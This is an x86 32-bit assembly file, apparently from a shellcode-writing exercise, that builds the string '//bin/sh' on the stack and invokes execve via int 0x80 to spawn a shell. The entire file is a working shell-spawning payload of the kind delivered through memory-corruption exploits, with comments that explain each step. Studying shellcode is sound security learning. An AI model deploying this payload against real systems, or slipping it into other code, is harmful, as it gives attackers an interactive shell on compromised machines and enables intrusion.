BITS 32

; Method 2: Push the string directly onto the stack instead of using the 'string trick'

; zero out registers
xor		eax,eax
xor		ecx,ecx
cdq				; convert dword in eax to qword in edx

; push the string //bin/sh onto the stack
push		0x68732f6e	; push 'hs/n'
push		0x69622f2f	; push 'ib//'
mov		ebx,esp		; first argument for execve -> stack pointer = pointer to our string
mov byte	[esp + 8], al	; null-terminate the string
mov		al,0xb		; syscall number 0xb (11) is execve
int		0x80		; let the kernel do the stuff
